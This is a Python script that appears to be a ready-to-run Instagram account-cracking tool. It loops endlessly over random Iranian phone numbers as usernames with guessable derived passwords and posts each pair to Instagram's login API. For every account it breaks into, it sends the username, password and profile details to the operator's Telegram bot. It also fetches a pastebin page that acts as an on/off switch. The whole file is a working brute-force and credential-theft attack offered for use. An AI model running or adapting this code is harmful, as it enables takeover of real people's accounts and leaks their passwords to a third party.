import webbrowser
import os
import pyfiglet
os.system('clear')
try:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
aa=0
zz=0
E = '\033[1;31m'
G = '\033[2;96m'
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
Z2 = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E1 = '\x1b[1;31m' # احمر
G1 = '\x1b[1;32m'
S1 = '\x1b[1;33m'
Z = '\x1b[2;31m'
G2 = '\x1b[1;32m'
E = '\x1b[1;33m'
G = '\x1b[2;96m'
S = '\x1b[1;33m'
import time
timee = time.asctime()
t = time.localtime()
print('  ')
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/100)
os.system("clear") 
print('   ')
def a(z):
    for e in z:
     sys.stdout.write(e) 
     sys.stdout.flush() 
     sleep(0/100)
import time
timee= time.asctime()
t = time.localtime()
hunter1 = pyfiglet.figlet_format(" [TRC]")
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0/100)
j(Z+hunter1)
print('  ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0/100)
j(X+'*'*60)
print('  ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0/100)
sleep(1)
print('  ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0/100)
tok =  input(F+'  𝖳𝖮𝖪𝖨𝖭: '+Z)
print('  ')
ID = input(F+'  𝖨𝖣 : '+Z)
print('  ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0/100)
print('  ')
j(X+'*'*60)
print('  ')
import time
timee= time.asctime()
t = time.localtime()
current_time = time.strftime('%F==>%P:%H:%M:%S', t)
print('  ') 
sleep(0.9)

def code_mrko(userQ,password):
	cookie = secrets.token_hex(8)*2
	head = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"
}
	url_id = f'https://www.instagram.com/{userQ}/?__a=1'
	req_id= requests.get(url_id,headers=head).json()
	name    = str(req_id['graphql']['user']['full_name'])
	id    = str(req_id['graphql']['user']['id'])
	followers    = str(req_id['graphql']['user']['edge_followed_by']['count'])
	following    = str(req_id['graphql']['user']['edge_follow']['count'])
	isp    = str(req_id['graphql']['user']['is_private'])
	idd    = str(req_id['graphql']['user']['id'])
	bio    = str(req_id['graphql']['user']['biography'])
	re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
	ree = re.json()
	dat = ree['data']
	shug = (f"""
◆━━━━━━◆❃◆━━━━━━◆
✅𝖭𝖠𝖬𝖤 : {name}
✅𝖴𝖲𝖤𝖱 : {userQ}
✅𝖯𝖠𝖲𝖲 : {password}
✅𝖥𝖮𝖫𝖫𝖮𝖶𝖤𝖱𝖲 : {followers}
✅𝖥𝖮𝖫𝖫𝖮𝖶𝖨𝖭𝖦 : {following}
✅𝖣𝖠𝖳𝖤 : {dat}
◆━━━━━━◆❃◆━━━━━━◆
 """)
	tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={shug}''')
	i = requests.post(tlg)
	print(G+shug)
 

url='https://i.instagram.com/api/v1/accounts/login/'

headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)', 

             'Accept':'*/*', 

             'Cookie':'missing', 

             'Accept-Encoding':'gzip, deflate', 

             'Accept-Language':'en-US', 

             'X-IG-Capabilities':'3brTvw==', 

             'X-IG-Connection-Type':'WIFI', 

             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 

             'Host':'i.instagram.com'}

w = 'https://pastebin.com/raw/mpWBGQKF'
rss = requests.get(w).text
if 'I' in rss:
    sleep(0.01)
    user = '12345678900987654321'
    while True:
        us = str("".join(random.choice(user)for i in range(7)))
        username = '+98930'  +us
        password = '0930'  +us   
        uid = str(uuid4())              
        data = {
             'uuid':uid, 

             'password':password, 

             'username':username, 

             'device_id':uid, 

             'from_reg':'false', 

             '_csrftoken':'missing', 

             'login_attempt_countn':'0'}
        req= requests.post(url, headers=headers, data=data)        
        if 'logged_in_user' in req.json():
            zz+=1
            userQ = req.json()['logged_in_user']['username']
            code_mrko(userQ,password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print (Z+'USER : '+username+': PASS : '+password)
        else:
            
            print (Z+'USER : '+username+': PASS : '+password)
            aa+=1
المطور (𝖲𝖠𝖭𝖳𝖨𝖳𝖮)